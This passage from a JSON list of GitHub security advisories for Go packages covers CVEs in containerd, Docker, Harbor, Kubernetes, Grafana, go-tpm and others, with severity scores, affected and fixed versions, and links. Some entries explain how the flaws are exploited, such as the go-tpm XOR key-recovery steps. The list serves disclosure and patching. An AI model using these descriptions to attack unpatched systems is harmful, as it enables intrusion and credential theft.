maintainers would like to thank Brad Geesaman, Josh Larsen, Ian Coldwater, Duffie Cooley, and Rory McCune for responsibly disclosing this issue in accordance with the [containerd security policy](https://github.com/containerd/project/blob/master/SECURITY.md).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containerd/containerd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.2.14"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/containerd/containerd/security/advisories/GHSA-742w-89gc-8m9c"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-15157"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/commit/1ead8d9deb3b175bf40413b8c47b3d19c2262726"}, {"type": "WEB", "url": "https://darkbit.io/blog/cve-2020-15157-containerdrip"}, {"type": "PACKAGE", "url": "https://github.com/containerd/containerd"}, {"type": "WEB", "url": "https://github.com/containerd/containerd/releases/tag/v1.2.14"}, {"type": "WEB", "url": "https://usn.ubuntu.com/4589-1/"}, {"type": "WEB", "url": "https://usn.ubuntu.com/4589-2/"}, {"type": "WEB", "url": "https://www.debian.org/security/2021/dsa-4865"}], "database_specific": {"cwe_ids": ["CWE-522"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-24T17:51:17Z", "nvd_published_at": "2020-10-16T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8w94-cf6g-c8mg", "modified": "2021-10-05T16:31:02Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2014-5277"], "summary": "Man-in-the-Middle (MitM)", "details": "Docker before 1.3.1 and docker-py before 0.5.3 fall back to HTTP when the HTTPS connection to the registry fails, which allows man-in-the-middle attackers to conduct downgrade attacks and obtain authentication and image data by leveraging a network position between the client and the registry to block HTTPS traffic.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/docker/docker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2014-5277"}, {"type": "WEB", "url": "https://github.com/docker/docker/commit/8caacb18f8019dfda30d79c327397e5f5783c068"}, {"type": "PACKAGE", "url": "https://github.com/docker/docker"}, {"type": "WEB", "url": "https://groups.google.com/forum/#!topic/docker-user/oYm0i3xShJU"}, {"type": "WEB", "url": "https://groups.google.com/forum/#%21topic/docker-user/oYm0i3xShJU"}, {"type": "WEB", "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-5277"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-updates/2014-11/msg00048.html"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-13T21:41:48Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-9wvh-ff5f-xjpj", "modified": "2021-05-17T16:40:42Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2019-16097"], "summary": "Missing Authorization in Harbor", "details": "core/api/user.go in Harbor 1.7.0 through 1.8.2 allows non-admin users to create admin accounts via the POST /api/users API. This is fixed in 1.9.0-rc1.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.7.0"}, {"fixed": "1.9.0-rc1"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.8.9"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-16097"}, {"type": "WEB", "url": "https://github.com/goharbor/harbor/commit/b6db8a8a106259ec9a2c48be8a380cb3b37cf517"}, {"type": "WEB", "url": "https://github.com/goharbor/harbor/compare/v1.8.2...v1.9.0-rc1"}, {"type": "WEB", "url": "https://github.com/goharbor/harbor/releases/tag/v1.7.6"}, {"type": "WEB", "url": "https://github.com/goharbor/harbor/releases/tag/v1.8.3"}, {"type": "WEB", "url": "https://github.com/ianxtianxt/CVE-2019-16097"}, {"type": "WEB", "url": "https://unit42.paloaltonetworks.com/critical-vulnerability-in-harbor-enables-privilege-escalation-from-zero-to-admin-cve-2019-16097/"}, {"type": "WEB", "url": "http://www.vmware.com/security/advisories/VMSA-2019-0015.html"}], "database_specific": {"cwe_ids": ["CWE-862"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-17T16:40:42Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-5cgx-vhfp-6cf9", "modified": "2023-10-02T11:38:19Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2020-8568"], "summary": "Directory traversal in Kubernetes Secrets Store CSI Driver", "details": "Kubernetes Secrets Store CSI Driver versions v0.0.15 and v0.0.16 allow an attacker who can modify a `SecretProviderClassPodStatus/Status` resource the ability to write content to the host filesystem and sync file contents to Kubernetes Secrets. This includes paths under `var/lib/kubelet/pods` that contain other Kubernetes Secrets.\n\n### Specific Go Packages Affected\nsigs.k8s.io/secrets-store-csi-driver/controllers\nsigs.k8s.io/secrets-store-csi-driver/pkg/rotation\nsigs.k8s.io/secrets-store-csi-driver/pkg/secrets-store", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "sigs.k8s.io/secrets-store-csi-driver"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.0.15"}, {"fixed": "0.0.17"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-8568"}, {"type": "WEB", "url": "https://github.com/kubernetes-sigs/secrets-store-csi-driver/issues/378"}, {"type": "WEB", "url": "https://github.com/kubernetes-sigs/secrets-store-csi-driver/pull/371"}, {"type": "WEB", "url": "https://github.com/kubernetes-sigs/secrets-store-csi-driver/commit/c2cbb19e2eef16638fa0523383788a4bc22231fd"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes-sigs/secrets-store-csi-driver"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-secrets-store-csi-driver/c/Cb9cvymTzl4"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0629"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-22", "CWE-24"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-12T21:44:15Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-qq97-vm5h-rrhg", "modified": "2023-02-09T15:29:32Z", "published": "2022-02-08T18:53:56Z", "aliases": [], "summary": "OCI Manifest Type Confusion Issue", "details": "### Impact\n\nSystems that rely on digest equivalence for image attestations may be vulnerable to type confusion.\n\n### Patches\n\nUpgrade to at least `v2.8.0-beta.1`  if you are running `v2.x` release. If you use the code from the `main` branch, update at least to the commit after [b59a6f827947f9e0e67df0cfb571046de4733586](https://github.com/distribution/distribution/commit/b59a6f827947f9e0e67df0cfb571046de4733586).\n\n### Workarounds\n\nThere is no way to work around this issue without patching.\n\n### References\n\nDue to [an oversight in the OCI Image Specification](https://github.com/opencontainers/image-spec/pull/411) that removed the embedded `mediaType` field from manifests, a maliciously crafted OCI Container Image can cause registry clients to parse the same image in two different ways without modifying the image\u2019s digest by modifying the `Content-Type` header returned by a registry. This can invalidate a common pattern of relying on container image digests for equivalence.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [distribution](https://github.com/distribution/distribution) \n* Open an issue in [distribution-spec](https://github.com/opencontainers/distribution-spec) \n* Email us at [cncf-distribution-security@lists.cncf.io](mailto:cncf-distribution-security@lists.cncf.io)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/docker/distribution"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.8.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/distribution/distribution/security/advisories/GHSA-qq97-vm5h-rrhg"}, {"type": "WEB", "url": "https://github.com/opencontainers/image-spec/pull/411"}, {"type": "WEB", "url": "https://github.com/distribution/distribution/commit/b59a6f827947f9e0e67df0cfb571046de4733586"}, {"type": "PACKAGE", "url": "https://github.com/distribution/distribution/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0379"}], "database_specific": {"cwe_ids": ["CWE-843"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2022-02-08T18:53:56Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-5x92-p4p5-33c4", "modified": "2023-10-02T13:44:47Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2020-28348"], "summary": "Path Traversal in HashiCorp Nomad", "details": "HashiCorp Nomad and Nomad Enterprise 0.9.0 up to 0.12.7 client Docker file sandbox feature (github.com/hashicorp/nomad/drivers/docker) may be subverted when not explicitly disabled or when using a volume mount type. Fixed in 0.12.8, 0.11.7, and 0.10.8.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.9.0"}, {"fixed": "0.10.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.11.0-beta1"}, {"fixed": "0.11.7"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.12.0-beta1"}, {"fixed": "0.12.8"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-28348"}, {"type": "WEB", "url": "https://github.com/hashicorp/nomad/issues/9303"}, {"type": "WEB", "url": "https://github.com/hashicorp/nomad/pull/9321"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/nomad-0-12-8-0-11-7-and-0-10-8-released/17491"}, {"type": "WEB", "url": "https://github.com/hashicorp/nomad/blob/master/CHANGELOG.md#0128-november-10-2020"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-12T21:53:03Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-5x29-3hr9-6wpw", "modified": "2023-08-29T21:08:37Z", "published": "2022-02-11T23:18:09Z", "aliases": ["CVE-2020-8918"], "summary": "TPM 1.2 key authorization values vulnerable to TPM transport eavesdropper in go-tpm", "details": "### Impact\nTPM 2.0 users are unaffected by this issue.\n\nAn adversary eavesdropping on the TPM 1.2 transport path can calculate `usageAuth` for a key created with CreateWrapKey, even though this value is encrypted as part of the TPM 1.2 command protocol.\n\nThe TPM 1.2 CreateWrapKey command accepts two secrets: `usageAuth` and `migrationAuth`. The ADIP protocol ([TPM 1.2 specification, part 1, section 13.4](https://trustedcomputinggroup.org/wp-content/uploads/TPM-Main-Part-1-Design-Principles_v1.2_rev116_01032011.pdf)) calls for these values to be encrypted with two different XOR keys. Due to a bug in go-tpm prior to version 0.3.0, both `usageAuth` and `migrationAuth` are encrypted with the same XOR keystream. This allows an adversary to XOR `encUsageAuth` and `encMigrationAuth` together to calculate `usageAuth ^ encMigrationAuth`. Since `migrationAuth` is moot for all keys created with go-tpm's `CreateWrapKey` (since all keys created with this function are marked non-migratable), an adversary may guess or know (from code/binary inspection) that `migrationAuth` is all 0x00 bytes or some other fixed value. Such an adversary can then calculate `usageAuth` and use this value later to improperly use the created key, unbeknownst to the creator of the key.\n\n### Patches\nFixed in go-tpm version 0.3.0.\n\n### Workarounds\n\n- TPM 2.0 users: No workaround needed. This issue only affects TPM 1.2 users.\n- TPM 1.2 users: Call CreateWrapKey with a random 20-byte value for `migrationAuth`, even though that value is not used again (since CreateWrapKey creates keys that are non-migratable). Do not store or log this value.\n\n\n### Details\n\nTPM 1.2 uses a protocol called ADIP (Authorization Data Insertion Protocol) to encrypt authorization values over-the-wire for newly created objects. This prevents a bus-snooping attack like those publicized by TPM Genie. TPM 2.0 makes this optional (the way to do it is with parameter-encryption sessions). You can read more about ADIP in section 13.4 of Part 1: Design Principles in the latest [TPM 1.2 specification](https://trustedcomputinggroup.org/resource/tpm-main-specification/). Normally, ADIP consists of the following steps:\n```\nKey := SHA1(authSession.SharedSecret || a nonce)\nNote: nonces and auth values in TPM 1.2 are always 20 bytes\nEncAuth := XOR(Key, Auth)\n```\nWhen commands require one ADIP-encrypted auth value, the nonce is the last nonceEven (last nonce from the TPM).\nWhen commands require two ADIP-encrypted auth values, the nonce for the first auth value is still nonceEven, and the nonce for the second auth value is the last nonceOdd, which is the one being provided by the caller along with the current command on the session.\nThe reason for this is that you wouldn't want an adversary to be able to XOR the two encrypted auth values together and come up with (auth 1 XOR key) XOR (auth 2 XOR key) where the \"one-time\" pad key is used twice and cancels itself out.\n\nHere are the commands that take one authorization value by ADIP:\n\n- Seal (the sealed data's auth value)\n- Sealx (the sealed data's auth value)\n- CreateKey (the key's auth value)\n- MakeIdentity (the AIK's auth value)\n- ChangeAuth (the entity's new auth value)\n- ChangeAuthOwner (the new owner auth value)\n- Delegate_CreateKeyDelegation (the new delegation auth value)\n- Delegate_CreateOwnerDelegation (the new delegation auth value)\n- NV_DefineSpace (the NV's auth value)\n- CreateCounter (the counter's auth value)\n\nHere are the commands that take two authorization values by ADIP:\n\n- CreateWrapKey (the key's auth value, and the key's migration (to export out of the TPM) auth value)\n\nThe migrationAuth value is never used if the key does not have the `TPM_KEY_FLAGS.migratable` flag set on it. go-tpm does not currently allow the caller to set this flag.\nHere was the bug in our implementation of `CreateWrapKey()`:\n\nhttps://github.com/google/go-tpm/blob/16766ac4521425bd02ad23868fbdf24749268669/tpm/tpm.go#L1322-L1329\n\nHere we see that both usageAuth and migrationAuth are encrypted by the same XOR key. This is the correct key (i.e., it is based on nonceEven) for usageAuth, but not migrationAuth.\n\nThis means 2 things:\n\n**First: migrationAuth is being set to some value that is effectively unrelated to migrationAuth as passed by the caller.** Again, this is not interesting to all current callers (given that there is no way for them to pass `TPM_KEY_FLAGS.migratable` via the current API; migrationAuth is not a meaningful value).\n\n**Second, and much more importantly: a user of go-tpm is vulnerable to the following attack by a passive bus-snooping adversary (CVE-2020-8918)**\n1. Wait for a `CreateWrapKey` command\n2. Collect `encUsageAuth` and `encMigrationAuth`\n3. Calculate `(usageAuth XOR migrationAuth) := (encUsageAuth XOR encMigrationAuth)`\n4. Assuming migrationAuth is all 0x00 (a reasonable assumption for a caller who knows the key is not migratable), the calculation in (3) is the usage auth of the key.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/google/go-tpm"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.3.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/google/go-tpm/security/advisories/GHSA-5x29-3hr9-6wpw"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-8918"}, {"type": "WEB", "url": "https://github.com/google/go-tpm/pull/195"}, {"type": "WEB", "url": "https://github.com/google/go-tpm/commit/d7806cce857a1a020190c03348e5361725d8f141"}, {"type": "PACKAGE", "url": "https://github.com/google/go-tpm"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0095"}], "database_specific": {"cwe_ids": ["CWE-665"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-24T18:32:13Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-34jx-wx69-9x8v", "modified": "2023-09-18T19:40:25Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2019-1002101"], "summary": "Symlink Attack in kubectl cp", "details": "The kubectl cp command allows copying files between containers and the user machine. To copy files from a container, Kubernetes creates a tar inside the container, copies it over the network, and kubectl unpacks it on the user\u2019s machine. If the tar binary in the container is malicious, it could run any code and output unexpected, malicious results. An attacker could use this to write files to any path on the user\u2019s machine when kubectl cp is called, limited only by the system permissions of the local user. The untar function can both create and follow symbolic links. The issue is resolved in kubectl v1.11.9, v1.12.7, v1.13.5, and v1.14.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.11.9"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.12.0"}, {"fixed": "1.12.7"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.13.0"}, {"fixed": "1.13.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-1002101"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/75037"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/commit/47063891dd782835170f500a83f37cc98c3c1013"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHBA-2019:0619"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHBA-2019:0620"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHBA-2019:0636"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/BPV2RE5RMOGUVP5WJMXKQJZUBBLAFZPZ/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QZB7E3DOZ5WDG46XAIU6K32CXHXPXB2F/"}, {"type": "WEB", "url": "https://www.twistlock.com/labs-blog/disclosing-directory-traversal-vulnerability-kubernetes-copy-cve-2019-1002101/"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2019/06/21/1"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2019/08/05/5"}, {"type": "WEB", "url": "http://www.securityfocus.com/bid/107652"}], "database_specific": {"cwe_ids": ["CWE-59"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-19T21:58:27Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-rgjg-66cx-5x9m", "modified": "2023-10-02T12:01:50Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2018-15727"], "summary": "Grafana Authentication Bypass", "details": "Grafana before 4.6.4 and 5.x before 5.2.3 allows authentication bypass because an attacker can generate a valid \"remember me\" cookie knowing only a username of an LDAP or OAuth user.\n\n### Specific Go Packages Affected\ngithub.com/grafana/grafana/pkg/api", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "4.6.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "5.0.0"}, {"fixed": "5.2.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-15727"}, {"type": "WEB", "url": "https://github.com/grafana/grafana/commit/7baecf0d0deae0d865e45cf03e082bc0db3f28c3"}, {"type": "WEB", "url": "https://github.com/grafana/grafana/commit/df83bf10a225811927644bdf6265fa80bdea9137"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2018:3829"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:0019"}, {"type": "WEB", "url": "https://grafana.com/blog/2018/08/29/grafana-5.2.3-and-4.6.4-released-with-important-security-fix/"}, {"type": "WEB", "url": "https://www.securityfocus.com/bid/105184"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-20T21:09:16Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-jp32-vmm6-3vf5", "modified": "2023-08-30T11:46:16Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2015-5305"], "summary": "Directory Traversal in Kubernetes", "details": "Directory traversal vulnerability in Kubernetes, as used in Red Hat OpenShift Enterprise 3.0, allows attackers to write to arbitrary files via a crafted object type name, which is not properly handled before passing it to etcd.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kubernetes/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.1"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2015-5305"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/16381"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/commit/37f730f68c7f06e060f90714439bfb0dbb2df5e7"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/commit/68f2add9bd5d43b9da1424d87d88f83d120e17d0"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2015:1945"}, {"type": "WEB", "url": "https://access.redhat.com/security/cve/CVE-2015-5305"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1273969"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0701"}, {"type": "WEB", "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-5305"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-20T16:19:56Z", "nvd_published_at": "2015-11-06T18:59:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-wc9w-wvq2-ffm9", "modified": "2023-10-02T14:34:31Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2020-13379"], "summary": "Server Side Request Forgery in Grafana", "details": "The avatar feature in Grafana (github.com/grafana/grafana/pkg/api/avatar) 3.0.1 through 7.0.1 has an SSRF Incorrect Access Control issue that allows remote code execution. This vulnerability allows any unauthenticated user/client to make Grafana send HTTP requests to any URL and return its result to the user/client. This can be used to gain information about the network that Grafana is running on.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N/E:F/RL:O/RC:C"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.0.1"}, {"fixed": "6.7.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/grafana/grafana"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.0.0"}, {"fixed": "7.0.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-13379"}, {"type": "WEB", "url": "https://github.com/grafana/grafana/commit/ba953be95f0302c2ea80d23f1e5f2c1847365192"}, {"type": "WEB", "url": "https://community.grafana.com/t/grafana-7-0-2-and-6-7-4-security-update/31408"}, {"type": "WEB", "url": "https://community.grafana.com/t/release-notes-v6-7-x/27119"}, {"type": "WEB", "url": "https://community.grafana.com/t/release-notes-v7-0-x/29381"}, {"type": "WEB", "url": "https://grafana.com/blog/2020/06/03/grafana-6.7.4-and-7.0.2-released-with-important-security-fix/"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/r0928ee574281f8b6156e0a6d0291bfc27100a9dd3f9b0177ece24ae4@%3Cdev.ambari.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/r093b405a49fd31efa0d949ac1a887101af1ca95652a66094194ed933@%3Cdev.ambari.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/r40f0a97b6765de6b8938bc212ee9dfb5101e9efa48bcbbdec02b2a60@%3Cissues.ambari.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/r6670a6c29044bcb77d4e5d165b5bd13fffe37b84caa5d6471b13b3a2@%3Cdev.ambari.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/r6bb57124a21bb638f552d81650c66684e70fc1ff9f40b6a8840171cd@%3Cissues.ambari.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/r984c3b42a500f5a6a89fbee436b9432fada5dc27ebab04910aafe4da@%3Cissues.ambari.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/rad99b06d7360a5cf6e394afb313f8901dcd4cb777aee9c9197b3b23d@%3Cdev.ambari.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/rba0247a27be78bd14046724098462d058a9969400a82344b3007cf90@%3Cdev.ambari.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/rd0fd283e3844b9c54cd5ecc92d966f96d3f4318815bbf3ac41f9c820@%3Ccommits.ambari.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/re75f59639f3bc1d14c7ab362bc4485ade84f3c6a3c1a03200c20fe13@%3Cissues.ambari.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/re7c4b251b52f49ba6ef752b829bca9565faaf93d03206b1db6644d31@%3Cdev.ambari.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/rff71126fa7d9f572baafb9be44078ad409c85d2c0f3e26664f1ef5a2@%3Cdev.ambari.apache.org%3E"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/EEKSZ6GE4EDOFZ23NGYWOCMD6O4JF5SO/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/O2KSCCGKNEENZN3DW7TSPFBBUZH3YZXZ/"}, {"type": "WEB", "url": "https://mostwanted002.cf/post/grafanados/"}, {"type": "WEB", "url": "https://rhynorater.github.io/CVE-2020-13379-Write-Up"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20200608-0006/"}, {"type": "WEB", "url": "https://www.exploit-db.com/exploits/48638"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-06/msg00060.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-07/msg00083.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-10/msg00009.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-10/msg00017.html"}, {"type": "WEB", "url": "http://packetstormsecurity.com/files/158320/Grafana-7.0.1-Denial-Of-Service.html"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2020/06/03/4"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2020/06/09/2"}], "database_specific": {"cwe_ids": ["CWE-918"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-14T16:27:02Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-x5f3-qmwj-4f84", "modified": "2023-10-02T11:32:33Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2021-25835"], "summary": "Authentication bypass by capture-replay in github.com/cosmos/ethermint", "details": "Cosmos Network Ethermint <= v0.4.0 is affected by a cross-chain transaction replay vulnerability in the EVM module. Since ethermint uses the same chainIDEpoch and signature schemes with ethereum for compatibility, a verified signature in ethereum is still valid in ethermint with the same msg content and chainIDEpoch, which enables \"cross-chain transaction replay\" attack.\n\n### Specific Go Packages Affected\ngithub.com/cosmos/ethermint/rpc/namespaces/eth", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cosmos/ethermint"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.4.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-25835"}, {"type": "WEB", "url": "https://github.com/cosmos/ethermint/issues/687"}, {"type": "WEB", "url": "https://github.com/cosmos/ethermint/pull/692"}, {"type": "WEB", "url": "https://github.com/cosmos/ethermint/releases/tag/v0.4.1"}], "database_specific": {"cwe_ids": ["CWE-294", "CWE-295"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-12T21:11:09Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-m358-g4rp-533r", "modified": "2022-02-07T21:15:30Z", "published": "2022-02-01T00:49:39Z", "aliases": ["CVE-2022-24124"], "summary": "SQL Injection in Casdoor", "details": "The query API in Casdoor before 1.13.1 has 